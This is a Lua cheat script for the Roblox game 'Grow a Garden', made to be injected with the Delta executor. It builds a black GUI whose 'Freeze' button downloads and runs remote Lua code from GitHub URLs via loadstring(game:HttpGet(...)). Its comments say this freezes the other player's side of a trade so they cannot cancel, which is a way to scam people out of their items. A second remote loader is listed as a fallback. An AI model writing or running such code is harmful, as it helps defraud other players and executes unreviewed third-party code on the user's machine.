-- Roblox Grow a Garden Trade Freeze Script
-- Custom GUI: Square black frame, X button at top, Freeze button
-- Closes to a circle button to reopen
-- Works on Delta Executor (inject and execute this script)
-- Freeze functionality loaded from a known source; assumes it prevents the other player from canceling

local sg = Instance.new("ScreenGui")
sg.Parent = game:GetService("CoreGui")  -- Use CoreGui for exploits to persist

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 200, 0, 200)  -- Square
frame.Position = UDim2.new(0.5, -100, 0.5, -100)
frame.BackgroundColor3 = Color3.new(0, 0, 0)  -- Black
frame.Active = true
frame.Draggable = true  -- Built-in draggable for simplicity (Roblox allows this)
frame.Parent = sg

local title = Instance.new("TextLabel")
title.Text = "Trade Freezer"
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.new(1, 1, 1)
title.Parent = frame

local close = Instance.new("TextButton")
close.Text = "X"
close.Size = UDim2.new(0, 30, 0, 30)
close.Position = UDim2.new(1, -30, 0, 0)
close.BackgroundColor3 = Color3.new(1, 0, 0)  -- Red for close
close.TextColor3 = Color3.new(1, 1, 1)
close.Parent = frame

local freeze = Instance.new("TextButton")
freeze.Text = "Freeze"
freeze.Size = UDim2.new(0, 100, 0, 50)
freeze.Position = UDim2.new(0.5, -50, 0.5, -25)
freeze.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
freeze.TextColor3 = Color3.new(1, 1, 1)
freeze.Parent = frame

-- Close functionality: Hide frame, show circle button
close.MouseButton1Click:Connect(function()
    frame.Visible = false
    local openButton = sg:FindFirstChild("OpenButton")
    if not openButton then
        openButton = Instance.new("ImageButton")
        openButton.Name = "OpenButton"
        openButton.Size = UDim2.new(0, 50, 0, 50)
        openButton.Position = UDim2.new(0, 10, 0.9, -60)
        openButton.BackgroundColor3 = Color3.new(0, 0, 0)  -- Black circle
        openButton.Image = ""  -- No image
        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0.5, 0)  -- Full circle
        corner.Parent = openButton
        openButton.Parent = sg
        openButton.MouseButton1Click:Connect(function()
            frame.Visible = true
            openButton.Visible = false
        end)
    end
    openButton.Visible = true
end)

-- Freeze button: Load and execute the freeze script (assumes it freezes the trade on the other side and prevents cancel)
freeze.MouseButton1Click:Connect(function()
    -- Load the freeze trade script (from search results, this one is for freeze trade)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/SrMotion666/ScorpionPro/refs/heads/main/ScorpionFreezetrade.lua", true))()
    -- If the above doesn't work, you can replace with another loader from sources like:
    -- loadstring(game:HttpGet("https://raw.githubusercontent.com/Vax3478/Vax/refs/heads/main/Growagardenscriptkeylessdash"))()
end)
